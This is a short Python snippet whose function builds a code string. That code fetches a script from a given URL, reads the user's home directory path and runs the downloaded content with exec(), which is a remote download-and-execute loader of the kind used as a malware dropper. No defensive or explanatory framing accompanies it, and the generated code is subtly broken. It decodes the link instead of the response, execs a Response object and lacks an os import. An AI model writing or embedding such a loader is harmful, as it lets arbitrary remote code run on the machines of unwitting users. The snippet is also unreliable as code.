import requests as r

def return_downloader(link):
    return(f"""
    script = r.get({link}.decode('utf-8'))
    username = os.path.expanduser('~')

    if script.status_code == 200:
        exec(script)
    else:
        exit()
    """
    )
